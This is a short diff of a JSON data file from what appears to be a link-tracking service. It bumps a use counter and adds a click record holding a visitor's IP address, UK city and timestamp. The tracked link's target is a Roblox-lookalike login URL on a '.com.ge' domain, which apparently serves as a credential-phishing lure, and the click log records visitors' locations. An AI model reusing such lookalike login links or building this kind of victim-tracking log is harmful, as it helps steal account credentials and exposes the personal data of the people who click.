@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1336,
+    "useCount": 1337,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10851,6 +10851,14 @@
       },
       {
         "timestamp": 1777410026278,
+        "ip": "188.29.10.66",
+        "country": "United Kingdom",
+        "city": "Worcester Park",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777410131727,
         "ip": "188.29.10.66",
         "country": "United Kingdom",
         "city": "Worcester Park",
